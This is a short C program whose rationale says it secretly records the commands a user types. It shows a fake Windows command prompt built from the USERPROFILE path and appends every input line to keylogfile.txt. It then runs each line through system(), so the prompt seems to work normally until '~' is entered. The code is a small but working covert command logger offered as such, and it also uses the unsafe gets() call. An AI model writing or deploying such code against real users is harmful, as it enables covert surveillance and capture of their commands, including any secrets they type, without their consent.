/*
AUTHOR: Mckoy BANTON
*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define MAX 500
/*
RATIONALE
The aim of the program is to secretly get the commands entered by a user and store these commands into a file called 
"keylogfile.txt" and repeatedly capture these commands so long as the terminating character "~" is not entered. 

The program is indented for running on Windows OS
*/

void main() 
{
    char kbinput[MAX];
    int compare;
    FILE *fptr;
    fptr=fopen("keylogfile.txt", "a");
    char *path = getenv("USERPROFILE");//get the default prompt for a Windows OS

    if (fptr==NULL)//check for file "keylogfile.txt"
    {
        fclose(fptr);
        return;
    }

    if (path==NULL)//check for default prompt 
    {
        fclose(fptr);
        return;
    }

    printf("%s> ", path);
    gets(kbinput);
    fprintf(fptr,"%s\n",kbinput);//save to file

    compare=strcmp(kbinput,"~"); //compare terminating condition to command


    while(compare!=0)
    {
        system(kbinput);//execute command
        printf("%s> ", path);
       
        gets(kbinput);
        fprintf(fptr,"%s\n",kbinput);

        compare=strcmp(kbinput,"~");
    }

    fclose(fptr);
}